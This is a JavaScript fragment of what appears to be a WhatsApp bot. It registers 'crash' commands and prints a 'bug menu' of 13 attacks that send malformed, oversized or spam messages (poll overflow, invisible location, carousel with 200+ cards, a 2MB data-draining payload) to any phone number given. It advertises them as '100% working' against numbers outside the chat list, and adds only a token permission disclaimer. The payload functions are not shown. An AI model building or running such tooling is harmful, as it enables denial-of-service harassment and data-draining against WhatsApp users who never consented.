    { name: "blankvip", func: BlankVVIP, desc: "Group invite overflow crash" },
    { name: "dark", func: Dark, desc: "Sedot kuota (image + payload)" },
    { name: "locax", func: LocaX, desc: "Invisible location kuota crash" },
    { name: "fcflow", func: FcUiFlows, desc: "Interactive flow crash" },
    { name: "locxz", func: LocXz, desc: "Lock invisible crash" },
    { name: "spcm", func: SpcmCrash2, desc: "Force close crash" },
    { name: "carovy", func: CarouselVY, desc: "Carousel spam crash" }
];

commands.forEach(cmdDef => {
    cmd({
        pattern: cmdDef.name,
        desc: cmdDef.desc,
        category: "tools",
        filename: __filename
    }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
        const target = getTarget(args, from, reply, cmdDef.name);
        if (!target) return;
        await reply(`🔥 *${cmdDef.name.toUpperCase()} CRASH* → ${target}`);
        try {
            await cmdDef.func(conn, target);
            await reply(`✅ ${cmdDef.name.toUpperCase()} CRASH SENT to ${target}`);
        } catch (err) {
            console.error(err);
            await reply(`❌ Failed: ${err.message}`);
        }
    });
});

// ==================== BUG MENU (CLEAN STYLE) ====================
cmd({ pattern: "bugmenu", desc: "Show all crash commands", category: "tools", filename: __filename },
async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 BUG MENU 」─*
*│ 📌 .pollbug      : Poll overflow crash*
*│ 📌 .bug          : ViewOnce product crash*
*│ 📌 .callinv      : Call permission crash*
*│ 📌 .delayx       : Invisible delay crash*
*│ 📌 .delay2       : List response crash*
*│ 📌 .ameliabeta   : Video + sticker combo*
*│ 📌 .blankvip     : Group invite overflow*
*│*
*│ 🧨 NEW ULTRA POWER 🧨*
*│ 📌 .dark         : Sedot kuota (image + 2MB)*
*│ 📌 .locax        : Invisible location spam*
*│ 📌 .fcflow       : Interactive flow (8 buttons)*
*│ 📌 .locxz        : Lock invisible (extended text)*
*│ 📌 .spcm         : Force close (malformed)*
*│ 📌 .carovy       : Carousel spam (200+ cards)*
*│*
*│ 🟢 Status : 100% working – direct send*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Total commands : 13*
*╰──────────────●●►*
> 💡 *Usage:* .command 947XXXXXXXXX
> 📌 *Example:* .bug 94712345678
> ⚠️ *Use only on numbers you own or have permission.*
    `;
    await reply(menu);
});
